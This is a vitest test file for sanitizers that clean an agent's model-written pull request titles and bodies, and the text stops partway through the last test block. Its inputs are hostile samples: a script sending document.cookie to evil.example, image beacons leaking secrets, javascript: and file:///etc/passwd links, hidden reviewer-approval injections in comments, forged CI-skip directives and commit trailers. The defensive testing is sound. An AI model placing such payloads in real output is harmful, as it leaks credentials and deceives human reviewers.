import { describe, expect, it } from 'vitest';
import {
	RUN_PULL_REQUEST_BODY_MAX_LENGTH,
	RUN_PULL_REQUEST_BODY_TRUNCATED_NOTE,
	RUN_PULL_REQUEST_TITLE_MARKER,
	RUN_PULL_REQUEST_TITLE_MAX_LENGTH,
	RUN_PULL_REQUEST_TITLE_MAX_LINE_LENGTH,
	applyRunPullRequestTitleToCommitMessage,
	composeRunPullRequestTitle,
	parseRunPullRequestTitle,
	sanitizeRunPullRequestBody,
	sanitizeRunPullRequestTitle,
	summarizeRunChangeInOneLine
} from '../run-pull-request-text.types.js';
import { containsCiSkipDirective } from '../../fleet/fleet-commit-message.types.js';
import { containsReservedFleetPushTrailer } from '../../fleet/fleet-push-credential.types.js';

/**
 * The text a pull request gets from an agent run. The summary is
 * model-authored and is posted to the git provider under the owner's identity,
 * so the properties pinned here are security properties: nobody is notified,
 * nothing is closed or cross-linked, nothing remote is loaded, nothing is
 * hidden, and code stays the code it was.
 */

const ZWSP = '\u200b';

// ─── a second, independent reading of the OUTPUT ─────────────────────────
//
// The sanitizer leaves code as written, so its safety rests on "what it took
// for code is code for a renderer too". These helpers read the OUTPUT the way a
// CommonMark renderer does (fences, then inline code with backslash escapes),
// once per line and once per table cell, and return what is left: the text a
// renderer would turn into mentions, references, tags and images.

function withoutInlineCode(text: string): string {
	let out = '';
	let index = 0;
	while (index < text.length) {
		const char = text[index]!;
		if (char === '\\' && index + 1 < text.length && /[!-/:-@[-`{-~]/.test(text[index + 1]!)) {
			out += text[index + 1];
			index += 2;
			continue;
		}
		if (char !== '`') {
			out += char;
			index += 1;
			continue;
		}
		let end = index;
		while (text[end] === '`') end += 1;
		const run = end - index;
		let close = -1;
		for (let scan = end; scan < text.length; ) {
			if (text[scan] !== '`') {
				scan += 1;
				continue;
			}
			let runEnd = scan;
			while (text[runEnd] === '`') runEnd += 1;
			if (runEnd - scan === run) {
				close = scan;
				break;
			}
			scan = runEnd;
		}
		if (close === -1) {
			out += text.slice(index, end);
			index = end;
		} else {
			index = close + run;
		}
	}
	return out;
}

function renderedProse(markdown: string, reading: 'paragraph' | 'table'): string {
	const lines: string[] = [];
	let fence: string | null = null;
	for (const line of markdown.split('\n')) {
		const marker = /^ {0,3}(`{3,}|~{3,})(.*)$/.exec(line);
		if (fence) {
			if (marker && marker[1]![0] === fence[0] && marker[1]!.length >= fence.length && !marker[2]!.trim()) {
				fence = null;
			}
			continue;
		}
		if (marker && (marker[1]![0] === '~' || !marker[2]!.includes('`'))) {
			fence = marker[1]!;
			continue;
		}
		lines.push(
			reading === 'table'
				? line
						.split(/(?<!\\)\|/)
						.map(withoutInlineCode)
						.join('|')
				: withoutInlineCode(line)
		);
	}
	// A paragraph is parsed as ONE run of inline text, so spans may pair across
	// its lines: read each paragraph whole as well.
	if (reading === 'paragraph') {
		return markdown
			.split(/\n{2,}/)
			.map((paragraph) => (/^ {0,3}(`{3,}|~{3,})/.test(paragraph) ? '' : withoutInlineCode(paragraph)))
			.concat(lines)
			.join('\n');
	}
	return lines.join('\n');
}

const LIVE = {
	mention: /[@\uff20][\p{L}\p{N}_-]/u,
	reference: /#\d|\bGH-\d/i,
	// The provider links the PATH on its own (`/issues/12`), not only a full URL.
	providerLink: /\/(?:issues|pull|pulls|discussions)\/\d/i,
	tag: /<[A-Za-z/!?]/,
	image: /!\[/,
	characterReference: /&(?!amp;|lt;)(?:#\d+|#x[0-9a-f]+|[a-z][a-z0-9]+);/i
};

/** Assert the output would render nothing live, under both readings. */
function expectInert(output: string, kinds: Array<keyof typeof LIVE> = Object.keys(LIVE) as Array<keyof typeof LIVE>) {
	for (const reading of ['paragraph', 'table'] as const) {
		const prose = renderedProse(output, reading);
		for (const kind of kinds) {
			expect(prose, `${kind} is live when read as a ${reading}:\n${output}`).not.toMatch(LIVE[kind]);
		}
	}
}

describe('parseRunPullRequestTitle', () => {
	it('takes the title from the last line and removes that line from the summary', () => {
		const summary = [
			'The salary filter dropped jobs whose minimum was 0.',
			'',
			'Changed `apps/web/src/filters/salary.ts` to compare against `null`.',
			'',
			'PR-TITLE: Keep zero-minimum jobs in the salary range filter'
		].join('\n');
		expect(parseRunPullRequestTitle(summary)).toEqual({
			title: 'Keep zero-minimum jobs in the salary range filter',
			summary: [
				'The salary filter dropped jobs whose minimum was 0.',
				'',
				'Changed `apps/web/src/filters/salary.ts` to compare against `null`.'
			].join('\n')
		});
	});

	it('reads the marker constant the contract teaches', () => {
		expect(RUN_PULL_REQUEST_TITLE_MARKER).toBe('PR-TITLE:');
		expect(parseRunPullRequestTitle(`done\n${RUN_PULL_REQUEST_TITLE_MARKER} Add a thing`).title).toBe(
			'Add a thing'
		);
	});

	it('ignores blank lines after the marker line, and Windows line endings', () => {
		expect(parseRunPullRequestTitle('Did it.\r\nPR-TITLE: Fix the redirect\r\n\r\n  \r\n')).toEqual({
			title: 'Fix the redirect',
			summary: 'Did it.'
		});
	});

	it.each([
		['the marker is not the last line', 'PR-TITLE: Fix the redirect\nAnd one more thing.'],
		['the marker is lower case', 'Did it.\npr-title: Fix the redirect'],
		['there is no space after the marker', 'Did it.\nPR-TITLE:Fix the redirect'],
		['the marker sits inside a sentence', 'Did it. PR-TITLE: Fix the redirect'],
		['the marker is indented like code', 'Did it.\n    PR-TITLE: Fix the redirect'],
		['the marker is followed by a closing fence', '```\nPR-TITLE: Fix the redirect\n```'],
		['the marker has no text', 'Did it.\nPR-TITLE:   '],
		['nothing usable is left of the text', 'Did it.\nPR-TITLE: <!-- x --> ** `` **'],
		['the line is a paragraph, not a title', `Did it.\nPR-TITLE: ${'word '.repeat(60)}`]
	])('takes NO title when %s, and leaves the summary as it was', (_why, summary) => {
		expect(parseRunPullRequestTitle(summary)).toEqual({ title: null, summary });
	});

	it('tolerates the emphasis and code marks a model wraps the line in', () => {
		for (const line of [
			'**PR-TITLE:** Fix the redirect',
			'**PR-TITLE: Fix the redirect**',
			'`PR-TITLE: Fix the redirect`',
			'_PR-TITLE:_ Fix the redirect',
			'  PR-TITLE: Fix the redirect'
		]) {
			expect(parseRunPullRequestTitle(`Did it.\n\n${line}`).title, line).toBe('Fix the redirect');
		}
	});

	it('cuts a long title at a word boundary instead of refusing it', () => {
		const long = 'Keep jobs whose minimum salary is zero in the salary range filter and in the saved search digest';
		const { title } = parseRunPullRequestTitle(`x\nPR-TITLE: ${long}`);
		expect(Array.from(title!).length).toBeLessThanOrEqual(RUN_PULL_REQUEST_TITLE_MAX_LENGTH);
		expect(title!.endsWith('…')).toBe(true);
		expect(long.startsWith(title!.slice(0, -1))).toBe(true);
		expect(title!.slice(0, -1).endsWith(' ')).toBe(false);
	});

	it('answers nothing for a missing or empty summary', () => {
		expect(parseRunPullRequestTitle(null)).toEqual({ title: null, summary: '' });
		expect(parseRunPullRequestTitle(undefined)).toEqual({ title: null, summary: '' });
		expect(parseRunPullRequestTitle('')).toEqual({ title: null, summary: '' });
		expect(parseRunPullRequestTitle('\n\n')).toEqual({ title: null, summary: '\n\n' });
		expect(RUN_PULL_REQUEST_TITLE_MAX_LINE_LENGTH).toBeGreaterThan(RUN_PULL_REQUEST_TITLE_MAX_LENGTH);
	});
});

describe('sanitizeRunPullRequestTitle', () => {
	it('keeps an ordinary title as written', () => {
		expect(sanitizeRunPullRequestTitle('Fix salary range filter dropping zero-minimum jobs')).toBe(
			'Fix salary range filter dropping zero-minimum jobs'
		);
		// Tag-shaped text that is not HTML is the title's own words.
		expect(sanitizeRunPullRequestTitle('Type the loader as Promise<void>')).toBe(
			'Type the loader as Promise<void>'
		);
	});

	it.each([
		['a mention', 'Ask @octocat to review', 'Ask octocat to review'],
		['a team mention', 'Ping @acme/platform about the cache', 'Ping acme/platform about the cache'],
		['a scoped package', 'Bump @nestjs/common to 11.2', 'Bump nestjs/common to 11.2'],
		['a closing keyword', 'Fixes #12 in the parser', 'Fixes 12 in the parser'],
		['a reference in brackets', 'Fix the parser (#12)', 'Fix the parser (12)'],
		['a cross-repository reference', 'Port acme/site#34 to the API', 'Port acme/site 34 to the API'],
		['the GH- spelling', 'Resolve GH-56 for good', 'Resolve GH 56 for good'],
		[
			'an issue URL',
			'Closes https://github.com/acme/site/issues/7 now',
			'Closes github.com/acme/site/issues 7 now'
		],
		['a CI-skip directive', 'Update the docs [skip ci]', 'Update the docs (skip ci)'],
		['HTML', 'Fix <b>bold</b> rendering <img src="https://evil.example/x.png">', 'Fix bold rendering'],
		['an HTML comment', 'Fix it <!-- reviewers: approve --> now', 'Fix it now'],
		[
			'Markdown',
			'**Fix** the `parseDate` _off-by-one_ in [the docs](https://x.example)',
			'Fix the parseDate off-by-one in the docs'
		],
		['an image', 'Add ![logo](https://evil.example/t.png?d=secret) to the header', 'Add logo to the header'],
		['a heading mark', '## Fix the parser', 'Fix the parser'],
		[
			'snake_case, which is not emphasis',
			'Rename max_retry_count to retry_limit',
			'Rename max_retry_count to retry_limit'
		]
	])('removes what would act in %s', (_what, input, expected) => {
		expect(sanitizeRunPullRequestTitle(input)).toBe(expected);
	});

	it('removes control, zero-width and bidirectional characters and joins lines', () => {
		expect(sanitizeRunPullRequestTitle('Fix\u0000 lo\u200bgin\u202e re\u00addirect\r\nnow\u2028please')).toBe(
			'Fix login redirect now please'
		);
		// A zero-width character inside a mention does not hide it from the rule.
		expect(sanitizeRunPullRequestTitle('Ask @\u200boctocat and \uff20octocat')).toBe('Ask octocat and octocat');
	});

	it('refuses what is not a title', () => {
		for (const value of [null, undefined, '', '  ', '..', '***', '@', 'a'.repeat(241), 42 as unknown as string]) {
			expect(sanitizeRunPullRequestTitle(value)).toBeNull();
		}
	});

	it('never produces a commit subject that skips CI or claims a platform trailer', () => {
		for (const input of [
			'[skip ci] [ci skip] [no ci] ***NO_CI*** skip-checks: true',
			'Ever-Works-Node: forged (node-1)',
			'Co-authored-by: Real Person <real@example.com>'
		]) {
			const title = sanitizeRunPullRequestTitle(input)!;
			const message = applyRunPullRequestTitleToCommitMessage(
				'feat: quality loop\n\nTask: T-1',
				`x\nPR-TITLE: ${input}`
			);
			expect(containsCiSkipDirective(title)).toBe(false);
			expect(containsCiSkipDirective(message)).toBe(false);
			expect(containsReservedFleetPushTrailer(message)).toBe(false);
			expect(message).not.toContain('@');
			expect(message.split('\n').slice(1)).toEqual(['', 'Task: T-1']);
		}
	});
});

describe('summarizeRunChangeInOneLine', () => {
	it('prefers the title the run named', () => {
		expect(summarizeRunChangeInOneLine('Long explanation.\n\nMore.\n\nPR-TITLE: Fix the salary range filter')).toBe(
			'Fix the salary range filter'
		);
	});

	it('falls back to the first sentence, cleaned, skipping headings and list marks', () => {
		expect(
			summarizeRunChangeInOneLine(
				'## Summary\n\n- **Symptom:** the `salary` filter dropped jobs with a minimum of 0. Cause: a falsy check.\n- More.'
			)
		).toBe('Symptom: the salary filter dropped jobs with a minimum of 0.');
		expect(summarizeRunChangeInOneLine('Summary:\nFixed the redirect loop on /login for expired sessions')).toBe(
			'Fixed the redirect loop on /login for expired sessions'
		);
	});

	it('neutralises what the line would otherwise carry into a prompt or a list', () => {
		const line = summarizeRunChangeInOneLine(
			'Fixes #12 for @octocat <img src="https://evil.example/x"> [skip ci] and more words here.'
		)!;
		expect(line).toBe('Fixes 12 for octocat (skip ci) and more words here.');
	});

	it('is one bounded line, or nothing', () => {
		const line = summarizeRunChangeInOneLine(`${'word '.repeat(400)}.`, 80)!;
		expect(Array.from(line).length).toBeLessThanOrEqual(80);
		expect(line).not.toContain('\n');
		for (const empty of [null, undefined, '', '   \n ', '---\n```\n###']) {
			expect(summarizeRunChangeInOneLine(empty)).toBeNull();
		}
		// A bare label is better than nothing, but only when nothing better follows.
		expect(summarizeRunChangeInOneLine('Done.')).toBe('Done.');
	});
});

describe('sanitizeRunPullRequestBody', () => {
	it('leaves an ordinary summary alone', () => {
		const summary = [
			'The salary filter dropped jobs whose minimum was 0 (a falsy check).',
			'',
			'- Changed `apps/web/src/filters/salary.ts` to compare against `null`.',
			'- Added `salary.spec.ts` with the zero case.',
			'',
			'I could not run anything: Bash is disabled in this session.'
		].join('\n');
		expect(sanitizeRunPullRequestBody(summary)).toBe(summary);
	});

	it('answers an empty string for anything that is not text', () => {
		for (const value of [null, undefined, '', 42 as unknown as string, {} as unknown as string]) {
			expect(sanitizeRunPullRequestBody(value)).toBe('');
		}
	});

	describe('mentions notify nobody', () => {
		it.each([
			['a user', 'Thanks @octocat for the report.'],
			['a team', 'cc @acme/platform-team'],
			['at the start of a line', '@octocat please look'],
			['after punctuation', '(@octocat), [@octocat], "@octocat"'],
			['an email address', 'Mail real.person@example.com about it'],
			['a backslash escape, which a renderer removes', 'Thanks \\@octocat'],
			['a decimal character reference', 'Thanks &#64;octocat'],
			['a padded decimal character reference', 'Thanks &#0064;octocat'],
			['a hexadecimal character reference', 'Thanks &#x40;octocat and &#X0040;octocat'],
			['a named character reference', 'Thanks &commat;octocat'],
			['a zero-width space after the @', `Thanks @${ZWSP}octocat`],
			['a zero-width joiner inside the name', 'Thanks @oct\u200docat'],
			['a soft hyphen and a BOM', 'Thanks @\u00adoct\ufeffocat'],
			['a full-width @', 'Thanks \uff20octocat'],
			['a comment between the @ and the name', 'Thanks @<!-- -->octocat'],
			['a tag between the @ and the name', 'Thanks @<b></b>octocat'],
			['a mention inside a link text', '[@octocat](https://example.com)'],
			['a mention inside emphasis', '**@octocat** and _@octocat_']
		])('breaks %s', (_what, input) => {
			const output = sanitizeRunPullRequestBody(input);
			expectInert(output, ['mention', 'characterReference', 'tag']);
			// Every `@` that is left is followed by the zero-width space this pass adds.
			expect(output.replace(/[@\uff20]\u200b/g, '')).not.toMatch(/[@\uff20]/);
		});
	});

	describe('nothing is closed or cross-linked', () => {
		const KEYWORDS = ['close', 'closes', 'closed', 'fix', 'fixes', 'fixed', 'resolve', 'resolves', 'resolved'];
		const TARGETS = [
			'#1',
			'acme/site#2',
			'https://github.com/acme/site/issues/3',
			'https://www.github.com/acme/site/pull/4',
			'github.com/acme/site/discussions/5',
			'acme/site/issues/9',
			'/pull/10',
			'/pulls/11',
			'GH-6',
			'gh-7',
			'\uff038'
		];

		it.each(KEYWORDS)('breaks every reference form after "%s"', (keyword) => {
			for (const target of TARGETS) {
				for (const phrase of [
					`${keyword} ${target}`,
					`${keyword.toUpperCase()}: ${target}`,
					`${keyword[0]!.toUpperCase()}${keyword.slice(1)}\t${target}.`,
					`This ${keyword} ${target}, ${keyword} ${target}`
				]) {
					expectInert(sanitizeRunPullRequestBody(phrase), ['reference', 'providerLink']);
				}
			}
		});

		it('breaks a bare cross-reference and a linked one', () => {
			const output = sanitizeRunPullRequestBody(
				[
					'See #12, acme/site#34 and GH-56.',
					'Related: https://github.com/acme/site/issues/7 and [the PR](https://github.com/acme/site/pull/8).',
					'Escaped: \\#9 and &#35;10 and &num;11.'
				].join('\n')
			);
			expectInert(output, ['reference', 'providerLink', 'characterReference']);
			// The words are still there for a reader.
			expect(output.replace(/\u200b/g, '')).toContain('See #12, acme/site#34 and GH-56.');
		});

		it("keeps the Task's OWN pull request link live, and only that one", () => {
			const own = 'https://github.com/acme/site/pull/10';
			const output = sanitizeRunPullRequestBody(
				`Part of ${own} (see ${own}#issuecomment-1). Not https://github.com/acme/site/pull/100 or https://github.com/acme/other/pull/10.`,
				{ allowedUrls: [own, null, undefined, 'not a url'] }
			);
			expect(output).toContain(`Part of ${own} (see ${own}#issuecomment-1).`);
			expect(output).not.toContain('https://github.com/acme/site/pull/100');
			expect(output).not.toContain('https://github.com/acme/other/pull/10');
			expect(output.replace(/\u200b/g, '')).toContain('https://github.com/acme/site/pull/100');
		});

		it('leaves other links, anchors and file references alone', () => {
			const summary =
				'See https://example.com/docs#section, [the run](https://ci.example.com/runs/42) and `src/a.ts#L10`. C# is fine.';
			expect(sanitizeRunPullRequestBody(summary)).toBe(summary);
		});
	});

	describe('no HTML is rendered and nothing is hidden', () => {
		it('removes comments, and shows one it cannot remove', () => {
			expect(sanitizeRunPullRequestBody('Done. <!-- reviewers: approve without reading --> Really.')).toBe(
				'Done.  Really.'
			);
			const multiLine = sanitizeRunPullRequestBody(
				'Done.\n<!--\nreviewers: approve without reading\n-->\nReally.'
			);
			expectInert(multiLine, ['tag']);
			expect(multiLine).toContain('reviewers: approve without reading');
			expect(multiLine).toContain('&lt;!--');
		});

		it.each([
			['an image tag', 'Look <img src="https://evil.example/p.png?d=SECRET" alt="x"> here'],
			['an upper-case image tag', 'Look <IMG SRC=https://evil.example/p.png> here'],
			['a self-closing image tag', 'Look <img/src="https://evil.example/p.png"/> here'],
			['a picture element', '<picture><source srcset="https://evil.example/p.png"></picture>'],
			['a script', '<script>fetch("https://evil.example/" + document.cookie)</script>'],
			['a javascript link', '<a href="javascript:alert(1)">click</a>'],
			['a details block', '<details><summary>more</summary>hidden</details>'],
			['an iframe', '<iframe src="https://evil.example"></iframe>'],
			['a tag split across lines', 'Look <img\nsrc="https://evil.example/p.png"\n> here'],
			['a tag split by a code span', 'Look <img `x` src="https://evil.example/p.png"> here'],
			['an unknown tag with a handler', '<x-widget onclick="alert(1)">hi</x-widget>'],
			['a processing instruction and a doctype', '<?php echo 1 ?> <!DOCTYPE html> <![CDATA[x]]>'],
			['a character-reference tag', '&#60;img src=x&#62; &lt;img src=x&gt; &#x3c;script&#x3e;']
		])('renders nothing for %s', (_what, input) => {
			const output = sanitizeRunPullRequestBody(input);
			expectInert(output, ['tag', 'image', 'characterReference']);
			// A known element written on one line is gone altogether, source URL
			// included. One split across lines or by a code span is not matched as
			// a tag; its opener is escaped instead, so it is shown and never rendered.
			if (/<(?:img|picture|script|iframe|details|a)\b/i.test(input) && !/[`\n]/.test(input)) {
				expect(output).not.toMatch(/src=|href=|srcset=/i);
			} else if (/[`\n]/.test(input)) {
				expect(output).toContain('&lt;img');
			}
		});

		it('keeps tag-shaped text that is not HTML, as text', () => {
			expect(sanitizeRunPullRequestBody('The loader returns Promise<void>, a < b and 1 <= 2.')).toBe(
				'The loader returns Promise&lt;void>, a < b and 1 <= 2.'
			);
		});

		it('reduces an image to its alternative text and never keeps its URL', () => {
			const output = sanitizeRunPullRequestBody(
				[
					'Before ![screenshot](https://evil.example/t.png?d=SECRET "title") after.',
					'Reference style: ![shot][ref] and ![shot].',
					'[ref]: https://evil.example/u.png',
					'Nested: [![badge](https://evil.example/b.svg)](https://evil.example/click)'
				].join('\n')
			);
			expectInert(output, ['image']);
			expect(output).toContain('Before screenshot after.');
			expect(output).not.toContain('t.png');
			expect(output).not.toContain('b.svg');
		});

		it('breaks script-like link schemes wherever they are written', () => {
			const output = sanitizeRunPullRequestBody(
				[
					'[click](javascript:alert(document.domain))',
					'[click](JaVaScRiPt:alert(1))',
					'[click](vbscript:msgbox(1)) [x](data:text/html;base64,PHNjcmlwdD4=) [y](file:///etc/passwd)',
					'[ref]: javascript:alert(1)',
					'<javascript:alert(1)>'
				].join('\n')
			);
			expect(output).not.toMatch(/(?:javascript|vbscript|data|file):/i);
			expectInert(output, ['tag']);
		});
	});

	describe('code stays the code it was', () => {
		it('keeps a fenced block byte-for-byte, whatever is in it', () => {
			const code = [
				'pnpm --filter @ever-works/agent test   # fixes #12',
				'<img src="https://example.com/x.png"> <!-- kept -->',
				'const x: Promise<void> = fn(`template ${y}`); // @octocat',
				'![alt](https://example.com/y.png) &#64;octocat'
			];
			const output = sanitizeRunPullRequestBody(['Ran:', '', '```sh', ...code, '```', '', 'Done.'].join('\n'));
			expect(output).toBe(['Ran:', '', '```sh', ...code, '```', '', 'Done.'].join('\n'));
		});

		it('keeps inline code byte-for-byte', () => {
			const summary =
				'Verified with `pnpm --filter @ever-works/agent test`, replaced `<div>` by `<button>`, see `#fff` and ``a `b` c``.';
			expect(sanitizeRunPullRequestBody(summary)).toBe(summary);
		});

		it('closes a fence the summary left open, so nothing after it becomes code', () => {
			const output = sanitizeRunPullRequestBody('Ran:\n```\npnpm test\n@octocat');
			expect(output).toBe('Ran:\n\n```\npnpm test\n@octocat\n```');
		});

		it('writes every fence in one canonical form', () => {
			// A tilde fence, an indented fence, a long fence around shorter ones,
			// an info string that is not a plain language word.
			expect(sanitizeRunPullRequestBody('~~~ts\nconst a = 1;\n~~~')).toBe('```ts\nconst a = 1;\n```');
			expect(sanitizeRunPullRequestBody('  ```js\n  x\n  ```\nafter @octocat')).toBe(
				`\`\`\`js\n  x\n\`\`\`\n\nafter @${ZWSP}octocat`
			);
			expect(sanitizeRunPullRequestBody('````md\n```\ninner\n```\n````')).toBe('````md\n```\ninner\n```\n````');
			expect(sanitizeRunPullRequestBody('```{.html onload=alert(1)}\nx\n```')).toBe('```\nx\n```');
			expect(sanitizeRunPullRequestBody('~~~\na ```` b\n~~~')).toBe('`````\na ```` b\n`````');
		});

		it('does not take a line for a closing fence when a renderer would not', () => {
			// Text after the backticks: this line is content, and the block runs on.
			const output = sanitizeRunPullRequestBody('```\ncode\n``` @octocat\nstill code @octocat');
			expect(output).toBe('````\ncode\n``` @octocat\nstill code @octocat\n````');
			// A shorter fence, or the other character, does not close either.
			expect(sanitizeRunPullRequestBody('````\na\n```\n~~~~\nb @octocat\n````\nout @octocat')).toBe(
				`\`\`\`\`\na\n\`\`\`\n~~~~\nb @octocat\n\`\`\`\`\n\nout @${ZWSP}octocat`
			);
		});

		it.each([
			['a span holding backticks', '`` `@octocat` ``', false],
			['three backticks used inline', '```@octocat``` and @octocat', true],
			['an opener with no closer', 'see `@octocat and more', true],
			['a longer opener than closer', '``@octocat` here', true],
			['a longer closer than opener', '`@octocat`` here', true],
			['escaped backticks, which are not code', '\\`@octocat\\`', true],
			['an escaped backslash before a real span', '\\\\`@octocat`', false],
			['a span that would close on the next line', 'see `@octocat\nand` @octocat `x`', true],
			['a stray backtick that would steal the next span', 'a ` b\n`ok` then @octocat `x` @octocat', true],
			['spans around prose', '`a` @octocat `b`', true],
			['a fence opener that is not one (backtick in its info)', '```@octocat`x\n@octocat', true],
			['a fence indented like code', '    ```\n@octocat\n    ```', true],
			['a fence inside a quote', '> ```\n> @octocat\n> ```\n@octocat', true],
			['a fence inside a list item, left open', '- item\n  ```\n  code\nafter @octocat', false],
			['a table row whose cells split a span', '| `a | @octocat` |\n| --- | --- |\n| `x | @octocat` | y |', true],
			['a span holding a pipe outside a table', 'run `cat x | grep @octocat` now', true],
			['an escaped pipe inside a cell span', '| `a \\| b` | @octocat |', true]
		])('is not fooled by %s', (_what, input, expectsNeutralised) => {
			const output = sanitizeRunPullRequestBody(input);
			expectInert(output);
			if (expectsNeutralised) expect(output).toContain(`@${ZWSP}`);
			else expect(output).not.toContain(ZWSP);
		});

		it('escapes a backtick run it could not close, so it is text for every reader', () => {
			expect(sanitizeRunPullRequestBody('see `@octocat and more')).toBe(`see \\\`@${ZWSP}octocat and more`);
			expect(sanitizeRunPullRequestBody('``a` b')).toBe('\\`\\`a\\` b');
		});
	});

	describe('invisible and control characters', () => {
		it('removes them from prose, and bidirectional overrides everywhere', () => {
			const output = sanitizeRunPullRequestBody(
				'Safe\u202e txt.exe \u0000\u0007here\u200b.\n\n```\nif (admin\u202e) {\u2066}\n```'
			);
			expect(output).toBe('Safe txt.exe here.\n\n```\nif (admin) {}\n```');
		});

		it('reads every line-break character as a line break', () => {
			expect(sanitizeRunPullRequestBody('a\r\nb\rc\u2028d\u2029e\u0085f')).toBe('a\nb\nc\nd\ne\nf');
		});

		it('drops half a surrogate pair instead of sending it', () => {
			expect(sanitizeRunPullRequestBody('ok \ud83d and \udc00 done \ud83d\ude00')).toBe(
				'ok  and  done \ud83d\ude00'
			);
		});
	});

	describe('CI-skip directives', () => {
		it('neutralises them in prose and in code alike (a description can become a commit message)', () => {
			const output = sanitizeRunPullRequestBody(
				'Docs only [skip ci].\n\n```\ngit commit -m "x [ci skip]"\n```\n\nskip-checks: true'
			);
			expect(containsCiSkipDirective(output)).toBe(false);
			expect(output).toContain('(skip ci)');
			expect(output).toContain('(ci skip)');
		});
	});

	describe('length', () => {
		it('cuts prose at a line or a word and says so', () => {
			const summary = Array.from({ length: 400 }, (_value, index) => `Line ${index} of the summary text.`).join(
				'\n'
			);
			const output = sanitizeRunPullRequestBody(summary, { maxLength: 1000 });
			expect(Array.from(output).length).toBeLessThanOrEqual(1000);
			expect(output.endsWith(`…\n\n${RUN_PULL_REQUEST_BODY_TRUNCATED_NOTE}`)).toBe(true);
			expect(output.startsWith('Line 0 of the summary text.\nLine 1 ')).toBe(true);
		});

		it('uses the default cap, and leaves a summary that fits untouched', () => {
			const exact = 'a'.repeat(RUN_PULL_REQUEST_BODY_MAX_LENGTH);
			expect(sanitizeRunPullRequestBody(exact)).toBe(exact);
			const over = sanitizeRunPullRequestBody(`${exact} b`);
			expect(Array.from(over).length).toBeLessThanOrEqual(RUN_PULL_REQUEST_BODY_MAX_LENGTH);
			expect(over).toContain(RUN_PULL_REQUEST_BODY_TRUNCATED_NOTE);
		});

		it('cuts a code block at a line and closes it', () => {
			const lines = Array.from({ length: 300 }, (_value, index) => `echo "${index} @octocat"`);
			const output = sanitizeRunPullRequestBody(
				['Ran:', '```sh', ...lines, '```', 'After @octocat.'].join('\n'),
				{
					maxLength: 800
				}
			);
			expect(Array.from(output).length).toBeLessThanOrEqual(800);
			const body = output.split('\n');
			expect(body.slice(0, 3)).toEqual(['Ran:', '', '```sh']);
			expect(body.at(-1)).toBe(RUN_PULL_REQUEST_BODY_TRUNCATED_NOTE);
			expect(body.at(-3)).toBe('```');
			expect(body.at(-4)).toMatch(/^echo "\d+ @octocat"$/);
			expectInert(output);
		});

		it('never cuts inside an inline code span', () => {
			const span = `\`pnpm --filter @ever-works/agent ${'x'.repeat(300)}\``;
			const output = sanitizeRunPullRequestBody(`${'word '.repeat(30)}${span} tail ${'more '.repeat(200)}`, {
				maxLength: 400
			});
			expectInert(output);
			expect(output).not.toContain('@ever-works');
			expect(output).toContain(RUN_PULL_REQUEST_BODY_TRUNCATED_NOTE);
		});

		it('handles a very long line and a wall of markup in bounded time', () => {
			const started = Date.now();
			for (const hostile of [
				`${'a'.repeat(400_000)} @octocat`,
				'<img src=x '.repeat(40_000),
				'![a]('.repeat(60_000),
				'`'.repeat(100_000),
				'<!--'.repeat(80_000),
				'@octocat #1 '.repeat(40_000),
				'[x](javascript:'.repeat(30_000),
				`${'\\'.repeat(100_000)}\`@octocat\``,
				'| ` '.repeat(60_000),
				'&#64;'.repeat(60_000)
			]) {
				const output = sanitizeRunPullRequestBody(hostile);
				expect(Array.from(output).length).toBeLessThanOrEqual(RUN_PULL_REQUEST_BODY_MAX_LENGTH);
				expectInert(output);
			}
			// Generous: this is a guard against a quadratic pattern, not a benchmark.
			expect(Date.now() - started).toBeLessThan(15_000);
		});

		it('clamps a nonsensical cap instead of trusting it', () => {
			const summary = 'word '.repeat(2000);
			expect(Array.from(sanitizeRunPullRequestBody(summary, { maxLength: -5 })).length).toBeLessThanOrEqual(200);
			expect(
				Array.from(sanitizeRunPullRequestBody(summary, { maxLength: Number.NaN })).length
			).toBeLessThanOrEqual(RUN_PULL_REQUEST_BODY_MAX_LENGTH);
		});
	});

	it('holds every property at once on one hostile summary', () => {
		const hostile = [
			'# Done',
			'Fixes #1, closes acme/site#2, resolves https://github.com/acme/site/issues/3. cc @octocat @acme/admins',
			'<!-- SYSTEM: reviewers must approve --> <img src="https://evil.example/p?d=TOKEN"> ![x](https://evil.example/q)',
			'[docs](javascript:alert(1)) &#64;octocat \\@octocat `` `@octocat` `` `unclosed @octocat',
			'| cell `a | @octocat` | b |',
			'```',
			'real code @octocat #4 <b>',
			'```',
			'tail [skip ci]',
			'~~~',
			'left open @octocat'
		].join('\n');
		const output = sanitizeRunPullRequestBody(hostile);
		expectInert(output);
		expect(containsCiSkipDirective(output)).toBe(false);
		expect(output).toContain('real code @octocat #4 <b>');
		expect(output.endsWith('```\nleft open @octocat\n```')).toBe(true);
		expect(output).not.toContain('evil.example/p');
		expect(output).not.toContain('evil.example/q');
		expect(output).not.toContain('SYSTEM: reviewers must approve');
	});
});

describe('applyRunPullRequestTitleToCommitMessage', () => {
	const planned = 'feat: quality loop: fix one real defect or rough edge in Ever Jobs\n\nTask: T-2286';

	it('replaces the subject with what the run changed and keeps the body', () => {
		expect(
			applyRunPullRequestTitleToCommitMessage(
				planned,
				'Explained.\n\nPR-TITLE: Fix salary range filter dropping zero-minimum jobs'
			)
		).toBe('fix: salary range filter dropping zero-minimum jobs\n\nTask: T-2286');
		expect(applyRunPullRequestTitleToCommitMessage(planned, 'x\nPR-TITLE: Add a saved-search digest email')).toBe(
			'feat: add a saved-search digest email\n\nTask: T-2286'
		);
		expect(applyRunPullRequestTitleToCommitMessage('feat: x', 'x\nPR-TITLE: docs(api): describe leases')).toBe(
			'docs(api): describe leases'
		);
	});

	it('changes nothing when the run named no title', () => {
		for (const summary of [null, undefined, '', 'Fixed it.', 'PR-TITLE: early\nthen more text']) {
			expect(applyRunPullRequestTitleToCommitMessage(planned, summary)).toBe(planned);
		}
		expect(applyRunPullRequestTitleToCommitMessage('', 'x\nPR-TITLE: Fix it')).toBe('');
	});

	it('keeps the subject inside the conventional length', () => {
		const message = applyRunPullRequestTitleToCommitMessage(
			planned,
			`x\nPR-TITLE: ${'Rework the salary range filter and its saved search digest '.repeat(3)}`
		);
		expect(Array.from(message.split('\n')[0]!).length).toBeLessThanOrEqual(72);
		expect(message.endsWith('\n\nTask: T-2286')).toBe(true);
	});
});

describe('composeRunPullRequestTitle', () => {
	it('is a conventional commit followed by the Task slug in brackets', () => {
		expect(
			composeRunPullRequestTitle({
				summary: 'Explained.\n\nPR-TITLE: Fix salary range filter dropping zero-minimum jobs',
				slug: 'T-2286'
			})
		).toBe('fix: salary range filter dropping zero-minimum jobs [T-2286]');
